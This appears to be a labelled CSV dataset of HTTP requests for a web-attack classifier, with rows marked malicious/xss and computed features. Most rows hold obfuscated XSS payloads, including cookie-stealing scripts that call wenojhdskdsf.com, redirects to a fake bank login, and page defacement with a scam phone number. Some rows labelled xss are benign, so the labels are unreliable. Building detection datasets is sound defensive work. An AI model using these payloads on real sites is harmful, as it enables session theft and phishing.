RequestMethod,RequestURIPath,RequestURIQuery,RequestProtocol,UserAgent,Referer,AcceptEncoding,ContentType,Accept,Cookie,Connection,OtherHeaders,RequestBody,ResponseStatus,AIVerdictLabel,AIVulnerabilityTypeLabel,RequestLength,PathLength,QueryLength,BodyLength,NumParams,LongestParamValueLength,NumSpecialChars,NumEncodedChars,NumDoubleEncodedChars,RatioSpecialCharsToTotalChars,NumKeywords,NumUniqueChars,IsJSONBody,IsXMLBody,IsMultipartForm,HasNumericPathSegment,DepthOfPath,UsesBase64Encoding,UsesHexEncoding,HasMultipleContentLength,InvalidHTTPVersion,NumHTTPHeaders,TimeOfDayHour,TimeOfDayDayOfWeek
PUT,/profile,,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:153,"{""name"": ""XSS+User+%3Cscript%3Ewindow.location.href+%3D+%22https%3A%2F%2Fpankofamerika.com%2Ffake_login%22%3B%3C%2Fscript%3E"", ""bio"": ""Some%2BXSS%2BBio""}",,malicious,xss,443,8,0,153,2,114,37,15,0,0.2298,5,41,True,False,False,False,1,False,True,False,False,6,20,Tuesday
GET,/rest/products/search,file=%3Ca+href%3D%22javascript%3Anew+Image%28%29.src+%3D+%22https%3A%2F%2Fwenojhdskdsf.com%2Flog_cookie.php%3Fc%3D%22+%2B+document.cookie%3B%22%3EDownload%3C%2Fa%3E,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,425,21,164,0,1,115,36,22,0,0.1946,2,38,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,data=%25253csCRIPt%25253eNEW%252BIMAge%252528%252529.src%252b%25253D%252B%252522htTps%25253a%25252F%25252fweNOjHDSkdSF.com%25252FlOG_CooKIE.PHp%25253fc%25253d%252522%252B%25252B%252bdocumEnT.CoOKie%25253b%25253c%25252fscRiPT%25253e,HTTP/1.1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,458,21,231,0,1,180,31,23,23,0.123,3,49,False,False,False,False,3,True,True,False,False,4,20,Tuesday
GET,/rest/products/search,q=%26%23x3c%3B%26%23x69%3B%26%23x6d%3B%26%23x67%3B%26%23x20%3B%26%23x73%3B%26%23x72%3B%26%23x63%3B%26%23x3d%3B%26%23x78%3B%26%23x20%3B%26%23x6f%3B%26%23x6e%3B%26%23x65%3B%26%23x72%3B%26%23x72%3B%26%23x6f%3B%26%23x72%3B%26%23x3d%3B%26%23x61%3B%26%23x6c%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x26%3B%26%23x23%3B%26%23x34%3B%26%23x30%3B%26%23x3b%3B%26%23x31%3B%26%23x26%3B%26%23x23%3B%26%23x34%3B%26%23x31%3B%26%23x3b%3B%26%23x3e%3B,HTTP/1.1,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,640,21,434,0,1,216,111,108,0,0.244,0,29,False,False,False,False,3,False,True,False,False,4,20,Tuesday
DELETE,/rest/cart/item/20,,HTTP/1.1,"Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,Content-Length:0,,,malicious,xss,262,18,0,0,0,0,4,0,0,0.2222,0,11,False,False,False,True,4,False,False,False,False,5,20,Tuesday
PUT,/rest/cart/item/7,,HTTP/1.1,Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots),,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:15,"{""quantity"": 2}",,malicious,xss,252,17,0,15,1,0,9,0,0,0.2812,0,20,True,False,False,True,4,True,False,False,False,6,20,Tuesday
GET,/rest/products/search,query=%3Cinput+type%3Dsearch+onmouseover%3Ddocument.body.innerHTML+%3D+%27%3Ch1%3ETrust+me%21%3C%2Fh1%3E%3Cp%3ECall+me+at+1+888+345+8443.%3C%2Fp%3E%27%3B+autofocus%3E,HTTP/1.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,420,21,166,0,1,122,37,19,0,0.1979,1,41,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,file=%26%23x64%3B%26%23x61%3B%26%23x74%3B%26%23x61%3B%26%23x3a%3B%26%23x74%3B%26%23x65%3B%26%23x78%3B%26%23x74%3B%26%23x2f%3B%26%23x68%3B%26%23x74%3B%26%23x6d%3B%26%23x6c%3B%26%23x2c%3B%26%23x25%3B%26%23x33%3B%26%23x43%3B%26%23x73%3B%26%23x63%3B%26%23x72%3B%26%23x69%3B%26%23x70%3B%26%23x74%3B%26%23x25%3B%26%23x33%3B%26%23x45%3B%26%23x64%3B%26%23x6f%3B%26%23x63%3B%26%23x75%3B%26%23x6d%3B%26%23x65%3B%26%23x6e%3B%26%23x74%3B%26%23x2e%3B%26%23x62%3B%26%23x6f%3B%26%23x64%3B%26%23x79%3B%26%23x2e%3B%26%23x69%3B%26%23x6e%3B%26%23x6e%3B%26%23x65%3B%26%23x72%3B%26%23x48%3B%26%23x54%3B%26%23x4d%3B%26%23x4c%3B%26%23x2b%3B%26%23x25%3B%26%23x33%3B%26%23x44%3B%26%23x2b%3B%26%23x25%3B%26%23x32%3B%26%23x37%3B%26%23x25%3B%26%23x33%3B%26%23x43%3B%26%23x68%3B%26%23x31%3B%26%23x25%3B%26%23x33%3B%26%23x45%3B%26%23x54%3B%26%23x72%3B%26%23x75%3B%26%23x73%3B%26%23x74%3B%26%23x2b%3B%26%23x6d%3B%26%23x65%3B%26%23x25%3B%26%23x32%3B%26%23x31%3B%26%23x25%3B%26%23x33%3B%26%23x43%3B%26%23x25%3B%26%23x32%3B%26%23x46%3B%26%23x68%3B%26%23x31%3B%26%23x25%3B%26%23x33%3B%26%23x45%3B%26%23x25%3B%26%23x33%3B%26%23x43%3B%26%23x70%3B%26%23x25%3B%26%23x33%3B%26%23x45%3B%26%23x43%3B%26%23x61%3B%26%23x6c%3B%26%23x6c%3B%26%23x2b%3B%26%23x6d%3B%26%23x65%3B%26%23x2b%3B%26%23x61%3B%26%23x74%3B%26%23x2b%3B%26%23x31%3B%26%23x2b%3B%26%23x38%3B%26%23x38%3B%26%23x38%3B%26%23x2b%3B%26%23x33%3B%26%23x34%3B%26%23x35%3B%26%23x2b%3B%26%23x38%3B%26%23x34%3B%26%23x34%3B%26%23x33%3B%26%23x2e%3B%26%23x25%3B%26%23x33%3B%26%23x43%3B%26%23x25%3B%26%23x32%3B%26%23x46%3B%26%23x70%3B%26%23x25%3B%26%23x33%3B%26%23x45%3B%26%23x25%3B%26%23x32%3B%26%23x37%3B%26%23x25%3B%26%23x33%3B%26%23x42%3B%26%23x25%3B%26%23x33%3B%26%23x43%3B%26%23x25%3B%26%23x32%3B%26%23x46%3B%26%23x73%3B%26%23x63%3B%26%23x72%3B%26%23x69%3B%26%23x70%3B%26%23x74%3B%26%23x25%3B%26%23x33%3B%26%23x45%3B,HTTP/1.1,Wget/1.21.3,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,1966,21,1829,0,1,912,459,456,0,0.2481,0,30,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,term=%3Cimg+src%3Dx+onsubmit%3Dwindow.location.href+%3D+%22https%3A%2F%2Fpankofamerika.com%2Ffake_login%22%3B%3E,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,373,21,112,0,1,83,23,12,0,0.1729,1,35,False,False,False,False,3,False,True,False,False,4,20,Tuesday
PUT,/profile,,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:64,"{""email"": ""updated_user3@example.com"", ""address"": ""123 Main St""}",,malicious,xss,347,8,0,64,2,25,17,0,0,0.2361,0,31,True,False,False,False,1,True,False,False,False,6,20,Tuesday
PUT,/profile,,HTTP/1.1,Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:287,"{""name"": ""%58%53%53%20%55%73%65%72%20%3c%73%76%67%2f%6f%6e%62%6c%75%72%3d%77%69%6e%64%6f%77%2e%6c%6f%63%61%74%69%6f%6e%2e%68%72%65%66%20%3d%20%22%68%74%74%70%73%3a%2f%2f%70%61%6e%6b%6f%66%61%6d%65%72%69%6b%61%2e%63%6f%6d%2f%66%61%6b%65%5f%6c%6f%67%69%6e%22%3b%3e"", ""bio"": ""Some+XSS+Bio""}",,malicious,xss,522,8,0,287,2,252,100,84,0,0.339,1,35,True,False,False,False,1,False,True,False,False,6,20,Tuesday
GET,/rest/products/search,id=%253Csvg%252Fonload%253Ddocument.body.innerHTML%2B%253D%2B%2527%253Ch1%253ETrust%2Bme%2521%253C%252Fh1%253E%253Cp%253ECall%2Bme%2Bat%2B1%2B888%2B345%2B8443.%253C%252Fp%253E%2527%253B%253E,HTTP/1.1,"Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,434,21,190,0,1,131,34,28,19,0.1611,0,39,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,term=%26%23x3c%3B%26%23x62%3B%26%23x6f%3B%26%23x64%3B%26%23x79%3B%26%23x20%3B%26%23x6f%3B%26%23x6e%3B%26%23x6c%3B%26%23x6f%3B%26%23x61%3B%26%23x64%3B%26%23x3d%3B%26%23x6e%3B%26%23x65%3B%26%23x77%3B%26%23x20%3B%26%23x49%3B%26%23x6d%3B%26%23x61%3B%26%23x67%3B%26%23x65%3B%26%23x28%3B%26%23x29%3B%26%23x2e%3B%26%23x73%3B%26%23x72%3B%26%23x63%3B%26%23x20%3B%26%23x3d%3B%26%23x20%3B%26%23x22%3B%26%23x68%3B%26%23x74%3B%26%23x74%3B%26%23x70%3B%26%23x73%3B%26%23x3a%3B%26%23x2f%3B%26%23x2f%3B%26%23x77%3B%26%23x65%3B%26%23x6e%3B%26%23x6f%3B%26%23x6a%3B%26%23x68%3B%26%23x64%3B%26%23x73%3B%26%23x6b%3B%26%23x64%3B%26%23x73%3B%26%23x66%3B%26%23x2e%3B%26%23x63%3B%26%23x6f%3B%26%23x6d%3B%26%23x2f%3B%26%23x6c%3B%26%23x6f%3B%26%23x67%3B%26%23x5f%3B%26%23x63%3B%26%23x6f%3B%26%23x6f%3B%26%23x6b%3B%26%23x69%3B%26%23x65%3B%26%23x2e%3B%26%23x70%3B%26%23x68%3B%26%23x70%3B%26%23x3f%3B%26%23x63%3B%26%23x3d%3B%26%23x22%3B%26%23x20%3B%26%23x2b%3B%26%23x20%3B%26%23x64%3B%26%23x6f%3B%26%23x63%3B%26%23x75%3B%26%23x6d%3B%26%23x65%3B%26%23x6e%3B%26%23x74%3B%26%23x2e%3B%26%23x63%3B%26%23x6f%3B%26%23x6f%3B%26%23x6b%3B%26%23x69%3B%26%23x65%3B%26%23x3b%3B%26%23x3e%3B,HTTP/1.1,Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,1341,21,1145,0,1,570,288,285,0,0.247,0,29,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,q=data%3Atext%2Fhtml%2C%253Cscript%253Enew%2BImage%2528%2529.src%2B%253D%2B%2522https%253A%252F%252Fwenojhdskdsf.com%252Flog_cookie.php%253Fc%253D%2522%2B%252B%2Bdocument.cookie%253B%253C%252Fscript%253E,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,464,21,203,0,1,149,34,26,18,0.1518,3,39,False,False,False,False,3,True,True,False,False,4,20,Tuesday
PUT,/profile,,HTTP/1.1,"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S918U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:737,"{""name"": ""&#x58;&#x53;&#X53;&#x20;&#x55;&#X73;&#x65;&#X72;&#X20;&#X3c;&#x73;&#x76;&#x67;&#X2f;&#x6F;&#X6E;&#x6D;&#x6f;&#x75;&#x73;&#x65;&#x6f;&#X76;&#X65;&#x72;&#x3D;&#x64;&#X6f;&#X63;&#x75;&#x6D;&#x65;&#x6e;&#X74;&#x2e;&#X62;&#x6F;&#X64;&#x79;&#X2e;&#X69;&#X6E;&#X6E;&#X65;&#x72;&#X48;&#X54;&#X4D;&#x4C;&#x20;&#X3D;&#X20;&#x27;&#X3C;&#x68;&#X31;&#x3E;&#X54;&#x72;&#x75;&#X73;&#x74;&#X20;&#X6D;&#X65;&#X21;&#x3C;&#X2F;&#X68;&#x31;&#X3E;&#X3C;&#X70;&#x3e;&#X43;&#x61;&#X6C;&#x6c;&#X20;&#x6D;&#X65;&#X20;&#x61;&#x74;&#X20;&#x31;&#x20;&#X38;&#x38;&#X38;&#x20;&#X33;&#x34;&#x35;&#x20;&#X38;&#X34;&#x34;&#x33;&#x2e;&#X3c;&#x2f;&#x70;&#X3e;&#x27;&#x3b;&#X3e;"", ""bio"": ""&#x53;&#x4f;&#x4d;&#x65;&#x20;&#x58;&#x73;&#x53;&#x20;&#x42;&#x69;&#x6f;""}",,malicious,xss,1048,8,0,737,2,642,371,0,0,0.498,0,39,True,False,False,False,1,False,False,False,False,6,20,Tuesday
GET,/rest/products/search,path=%253c%2561%2520%2568%2572%2565%2566%253D%2522%256a%2561%2576%2561%2573%2563%2572%2569%2570%2574%253a%2564%256f%2563%2575%256d%2565%256e%2574%252e%2562%256F%2564%2579%252e%2569%256e%256E%2565%2572%2548%2554%254d%254c%2520%253D%2520%2527%253C%2568%2531%253e%2554%2572%2575%2573%2574%2520%256D%2565%2521%253C%252f%2568%2531%253E%253c%2570%253e%2543%2561%256C%256C%2520%256d%2565%2520%2561%2574%2520%2531%2520%2538%2538%2538%2520%2533%2534%2535%2520%2538%2534%2534%2533%252E%253C%252f%2570%253E%2527%253b%2522%253e%254c%256F%2567%2569%256E%253c%252F%2561%253E,HTTP/1.1,"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S918U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,832,21,560,0,1,333,114,111,111,0.1962,0,30,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,search=data%3Atext%2Fhtml%2C%253Cscript%253Edocument.body.innerHTML%2B%253D%2B%2527%253Ch1%253ETrust%2Bme%2521%253C%252Fh1%253E%253Cp%253ECall%2Bme%2Bat%2B1%2B888%2B345%2B8443.%253C%252Fp%253E%2527%253B%253C%252Fscript%253E,HTTP/1.1,"Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) CriOS/125.0.6422.76 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,480,21,223,0,1,152,38,32,20,0.1557,2,39,False,False,False,False,3,True,True,False,False,4,20,Tuesday
PUT,/rest/cart/item/7,,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:15,"{""quantity"": 2}",,malicious,xss,323,17,0,15,1,0,9,0,0,0.2812,0,20,True,False,False,True,4,True,False,False,False,6,20,Tuesday
GET,/rest/products/search,path=data%3Atext%2Fhtml%2C%253Cscript%253Enew%2BImage%2528%2529.src%2B%253D%2B%2522https%253A%252F%252Fwenojhdskdsf.com%252Flog_cookie.php%253Fc%253D%2522%2B%252B%2Bdocument.cookie%253B%253C%252Fscript%253E,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,443,21,206,0,1,149,34,26,18,0.1498,3,38,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,file=%2526%2523%2558%2533%2563%253b%2526%2523%2558%2537%2533%253b%2526%2523%2578%2536%2533%253b%2526%2523%2558%2537%2532%253b%2526%2523%2578%2536%2539%253b%2526%2523%2578%2537%2530%253b%2526%2523%2558%2537%2534%253b%2526%2523%2578%2533%2545%253b%2526%2523%2558%2536%2545%253b%2526%2523%2578%2536%2535%253b%2526%2523%2558%2537%2537%253b%2526%2523%2558%2532%2530%253b%2526%2523%2558%2534%2539%253b%2526%2523%2578%2536%2564%253b%2526%2523%2558%2536%2531%253b%2526%2523%2558%2536%2537%253b%2526%2523%2558%2536%2535%253b%2526%2523%2558%2532%2538%253b%2526%2523%2558%2532%2539%253b%2526%2523%2558%2532%2545%253b%2526%2523%2558%2537%2533%253b%2526%2523%2558%2537%2532%253b%2526%2523%2558%2536%2533%253b%2526%2523%2578%2532%2530%253b%2526%2523%2558%2533%2564%253b%2526%2523%2578%2532%2530%253b%2526%2523%2558%2532%2532%253b%2526%2523%2578%2536%2538%253b%2526%2523%2558%2537%2534%253b%2526%2523%2558%2537%2534%253b%2526%2523%2578%2537%2530%253b%2526%2523%2558%2537%2533%253b%2526%2523%2558%2533%2561%253b%2526%2523%2578%2532%2566%253b%2526%2523%2558%2532%2566%253b%2526%2523%2558%2537%2537%253b%2526%2523%2578%2536%2535%253b%2526%2523%2558%2536%2565%253b%2526%2523%2578%2536%2546%253b%2526%2523%2558%2536%2541%253b%2526%2523%2578%2536%2538%253b%2526%2523%2578%2536%2534%253b%2526%2523%2558%2537%2533%253b%2526%2523%2558%2536%2542%253b%2526%2523%2578%2536%2534%253b%2526%2523%2578%2537%2533%253b%2526%2523%2558%2536%2536%253b%2526%2523%2558%2532%2565%253b%2526%2523%2558%2536%2533%253b%2526%2523%2558%2536%2546%253b%2526%2523%2558%2536%2544%253b%2526%2523%2558%2532%2546%253b%2526%2523%2558%2536%2543%253b%2526%2523%2578%2536%2546%253b%2526%2523%2578%2536%2537%253b%2526%2523%2558%2535%2546%253b%2526%2523%2578%2536%2533%253b%2526%2523%2578%2536%2566%253b%2526%2523%2578%2536%2566%253b%2526%2523%2578%2536%2562%253b%2526%2523%2558%2536%2539%253b%2526%2523%2558%2536%2535%253b%2526%2523%2558%2532%2545%253b%2526%2523%2578%2537%2530%253b%2526%2523%2558%2536%2538%253b%2526%2523%2558%2537%2530%253b%2526%2523%2578%2533%2546%253b%2526%2523%2558%2536%2533%253b%2526%2523%2578%2533%2544%253b%2526%2523%2578%2532%2532%253b%2526%2523%2558%2532%2530%253b%2526%2523%2558%2532%2562%253b%2526%2523%2578%2532%2530%253b%2526%2523%2578%2536%2534%253b%2526%2523%2578%2536%2566%253b%2526%2523%2558%2536%2533%253b%2526%2523%2558%2537%2535%253b%2526%2523%2558%2536%2564%253b%2526%2523%2558%2536%2535%253b%2526%2523%2578%2536%2565%253b%2526%2523%2578%2537%2534%253b%2526%2523%2558%2532%2565%253b%2526%2523%2578%2536%2533%253b%2526%2523%2558%2536%2566%253b%2526%2523%2558%2536%2566%253b%2526%2523%2558%2536%2562%253b%2526%2523%2558%2536%2539%253b%2526%2523%2558%2536%2535%253b%2526%2523%2578%2533%2562%253b%2526%2523%2558%2533%2543%253b%2526%2523%2578%2532%2546%253b%2526%2523%2558%2537%2533%253b%2526%2523%2578%2536%2533%253b%2526%2523%2578%2537%2532%253b%2526%2523%2578%2536%2539%253b%2526%2523%2578%2537%2530%253b%2526%2523%2558%2537%2534%253b%2526%2523%2558%2533%2565%253b,HTTP/1.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,3199,21,2945,0,1,1764,591,588,588,0.1993,0,28,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,id=data%25253Atext%25252Fhtml%25252C%2525253Cscript%2525253Ewindow.location.href%25252B%2525253D%25252B%25252522https%2525253A%2525252F%2525252Fpankofamerika.com%2525252Ffake_login%25252522%2525253B%2525253C%2525252Fscript%2525253E,HTTP/1.1,"Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) CriOS/125.0.6422.76 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,488,21,231,0,1,192,25,18,18,0.0992,3,34,False,False,False,False,3,True,True,False,False,4,20,Tuesday
GET,/rest/products/search,id=data%3Atext%2Fhtml%2C%253Cscript%253Enew%2BImage%2528%2529.src%2B%253D%2B%2522https%253A%252F%252Fwenojhdskdsf.com%252Flog_cookie.php%253Fc%253D%2522%2B%252B%2Bdocument.cookie%253B%253C%252Fscript%253E,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,441,21,204,0,1,149,34,26,18,0.1511,3,38,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,q=%2526%2523%2578%2533%2563%253b%2526%2523%2578%2536%2539%253b%2526%2523%2578%2536%2564%253b%2526%2523%2578%2536%2537%253b%2526%2523%2578%2532%2530%253b%2526%2523%2578%2537%2533%253b%2526%2523%2578%2537%2532%253b%2526%2523%2578%2536%2533%253b%2526%2523%2578%2533%2564%253b%2526%2523%2578%2537%2538%253b%2526%2523%2578%2532%2530%253b%2526%2523%2578%2536%2566%253b%2526%2523%2578%2536%2565%253b%2526%2523%2578%2536%2535%253b%2526%2523%2578%2537%2532%253b%2526%2523%2578%2537%2532%253b%2526%2523%2578%2536%2566%253b%2526%2523%2578%2537%2532%253b%2526%2523%2578%2533%2564%253b%2526%2523%2578%2536%2531%253b%2526%2523%2578%2536%2563%253b%2526%2523%2578%2536%2535%253b%2526%2523%2578%2537%2532%253b%2526%2523%2578%2537%2534%253b%2526%2523%2578%2532%2536%253b%2526%2523%2578%2532%2533%253b%2526%2523%2578%2533%2534%253b%2526%2523%2578%2533%2530%253b%2526%2523%2578%2533%2562%253b%2526%2523%2578%2533%2531%253b%2526%2523%2578%2532%2536%253b%2526%2523%2578%2532%2533%253b%2526%2523%2578%2533%2534%253b%2526%2523%2578%2533%2531%253b%2526%2523%2578%2533%2562%253b%2526%2523%2578%2533%2565%253b,HTTP/1.1,"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,1319,21,1082,0,1,648,219,216,216,0.1985,0,26,False,False,False,False,3,False,True,False,False,4,20,Tuesday
